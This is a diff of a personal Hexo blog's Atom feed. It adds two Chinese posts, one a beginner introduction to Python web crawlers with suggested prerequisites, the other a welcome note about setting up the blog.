-<p>2.Python<br>如果有编程基础的小伙伴儿，推荐看一个廖雪峰的Python教程就够了<br>没有编程基础的小伙伴，推荐看看视频教程（网易云课堂搜Python），然后再结合廖雪峰的教程，双管齐下。<br>其实知乎上总结的已经非常好了，我就不多唠叨了。知乎-如何系统的自学Python</p>
-<p>3.TCP/IP协议，HTTP协议<br>这些知识能够让你了解在网络请求和网络传输上的基本原理，了解就行，能够帮助今后写爬虫的时候理解爬虫的逻辑。<br>廖雪峰Python教程里也有简单介绍，可以参考：TCP/IP简介，HTTP协议<br>想更深入学习的小伙伴儿可以去网上多搜搜相关的书籍哦</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;#一.什么是爬虫&lt;br&gt;    &lt;a href=&quot;http://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;网络爬虫&lt;/a&gt;（又被称为网页
-    
-    </summary>
-    
-    
-      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
     
   </entry>
   
@@ -519,6 +545,59 @@ r = requests.options(&quot;http://httpbin.org/get&quot;)
     
     
       <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>初识python爬虫</title>
+    <link href="https://aiwanxia.github.io/2017/03/05/python%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8(%E4%B8%80)/"/>
+    <id>https://aiwanxia.github.io/2017/03/05/python爬虫入门(一)/</id>
+    <published>2017-03-05T02:58:52.000Z</published>
+    <updated>2017-03-06T13:01:41.890Z</updated>
+    
+    <content type="html"><![CDATA[<p>#一.什么是爬虫<br>    <a href="http://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB" target="_blank" rel="external">网络爬虫</a>（又被称为网页蜘蛛，网络机器人，在FOAF社区中间，更经常的称为网页追逐者），是一种按照一定的规则，自动地抓取万维网信息的程序或者脚本。另外一些不常使用的名字还有蚂蚁、自动索引、模拟程序或者蠕虫。</p>
+<p>打开一个网页，里面有网页内容吧，想象一下，有个工具，可以把网页上的内容获取下来，存到你想要的地方，这个工具就是我们今天的主角：爬虫。</p>
+<p>这样是不是更清晰了呢？</p>
+<p>既然了解了爬虫是什么，那么爬虫是如何爬取数据的呢？</p>
+<p>#二.爬虫是哪里爬取数据的<br>    鼠标在页面上点击右键，然后点击view page source。看到这些文字了吗？这才是网页最赤果果的样子。<a href="http://upload-images.jianshu.io/upload_images/3879861-32b85a59ff142691.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=6226699" target="_blank" rel="external">网页</a></p>
+<pre><code>其实所有的网页都是HTML代码，只不过浏览器将这些代码解析成了上面的网页，我们的小爬虫抓取的其实就是HTML代码中的文本啦。
+</code></pre><p>这不合理啊，难不成那些图片也是文本？</p>
+<p>恭喜你，答对了。回到浏览器中有图的哪个tab页，鼠标右键，点击Inspect。会弹出一个面板，点击板左上角的箭头，点击虐狗图片，你会看到下面有红圈圈的地方，是图片的网络地址。图片可以通过该地址保存到本地哦。<br>    你猜的没错，我们的小爬虫抓取的正是网页中的数据，你要知道你想要抓取什么数据，你的目标网站是什么，才可以把想法变成现实的哦。你不能说，我想要这个这个，还有这个，然后数据就自动来了。</p>
+<p>#四、学习爬虫的必备知识</p>
+<p> 1.HTML<br>这个能够帮助你了解网页的结构，内容等。可以参考W3School的教程。</p>
+<p>2.Python<br>如果有编程基础的小伙伴儿，推荐看一个廖雪峰的Python教程就够了<br>没有编程基础的小伙伴，推荐看看视频教程（网易云课堂搜Python），然后再结合廖雪峰的教程，双管齐下。<br>其实知乎上总结的已经非常好了，我就不多唠叨了。知乎-如何系统的自学Python</p>
+<p>3.TCP/IP协议，HTTP协议<br>这些知识能够让你了解在网络请求和网络传输上的基本原理，了解就行，能够帮助今后写爬虫的时候理解爬虫的逻辑。<br>廖雪峰Python教程里也有简单介绍，可以参考：TCP/IP简介，HTTP协议<br>想更深入学习的小伙伴儿可以去网上多搜搜相关的书籍哦</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;#一.什么是爬虫&lt;br&gt;    &lt;a href=&quot;http://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;网络爬虫&lt;/a&gt;（又被称为网页
+    
+    </summary>
+    
+    
+      <category term="python" scheme="https://aiwanxia.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>never give up</title>
+    <link href="https://aiwanxia.github.io/2017/03/05/never-give-up/"/>
+    <id>https://aiwanxia.github.io/2017/03/05/never-give-up/</id>
+    <published>2017-03-05T02:58:52.000Z</published>
+    <updated>2017-03-06T13:25:36.021Z</updated>
+    
+    <content type="html"><![CDATA[<p>hello,welcome to my personal blog!<br>搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令<code>npm install -g hexo-cli</code>安装的是最新版本，所以会常常出错，但是，never give up,只要你愿意找，你始终会找到答案的，相信自己可以的，不要放弃，下面我给大家讲讲搭建博客时的一些坑，及如何解决！</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;hello,welcome to my personal blog!&lt;br&gt;搭建博客的时候遇见了很多坑，因为网上的教程大多都是hexo 2.X的，现在使用命令&lt;code&gt;npm install -g hexo-cli&lt;/code&gt;安装的是最新版本，所以会常常出错，但是，ne
+    
+    </summary>
+    
+    
+      <category term="前言" scheme="https://aiwanxia.github.io/tags/%E5%89%8D%E8%A8%80/"/>
     
   </entry>
   
